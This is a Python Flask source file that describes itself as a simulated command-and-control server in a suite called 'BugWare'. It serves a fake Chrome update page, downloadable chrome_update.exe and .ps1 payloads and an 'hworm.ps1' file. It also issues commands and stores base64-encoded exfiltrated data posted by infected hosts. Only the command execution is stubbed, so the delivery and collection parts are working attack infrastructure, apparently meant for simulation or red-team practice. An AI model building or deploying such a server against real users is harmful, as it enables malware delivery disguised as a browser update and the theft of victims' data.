"""
Cuckoo's Wasp Server - A simple Flask server to simulate command and control (C2) operations.
Serves update files, handles commands, and receives exfiltrated data.

Author: Cyberpanther-Dev / ChatGPT
Suite: BugWare
Created on: 2024-06-20
Version: 1.0
"""

from flask import Flask, send_file, render_template, request
import os
import base64

app = Flask(__name__)
UPDATE_FILE_PATH = "chrome_update.exe"
UPDATE_FILE_PS = "chrome_update.ps1"

PORT = 8080

@app.route('/command', methods=['GET'])
def command():
    os.system("touch command_executed.txt")  # Simulate command execution

    return "execute", 200

@app.route('/status', methods=['GET'])
def status():
    return "OK", 200

@app.route('/', methods=['GET'])
def index():    
    return render_template('chrome_update.html')

@app.route('/chrome_update.exe', methods=['GET'])
def serve_update():
    if os.path.exists(UPDATE_FILE_PATH):
        return send_file(UPDATE_FILE_PATH, as_attachment=True)
    else:
        return "Update file not found.", 404
    
@app.route('/chrome_update.ps1', methods=['GET'])
def ps_update():
    if os.path.exists(UPDATE_FILE_PS):
        return send_file(UPDATE_FILE_PS, as_attachment=True)
    else:
        return "Update file not found.", 404
    
@app.route('/health', methods=['GET'])
def health_check():
    return "Healthy", 200

@app.route("/hworm.ps1", methods=['GET'])
def hworm_download():
    package_path = "hworm.ps1"
    if os.path.exists(package_path):
        return send_file(package_path, as_attachment=True)
    else:
        return "Package not found.", 404
    
@app.route('/exfiltrate', methods=['POST'])
def exfiltrate_data():
    data = request.get_data()
    decoded_data = base64.b64decode(data).decode('utf-8', errors='ignore')
    print(f"Exfiltrated Data: {decoded_data}")
    with open("exfiltrated_data.txt", "ab") as f:
        f.write(data + b"\n")
    
    return "Data received", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
    
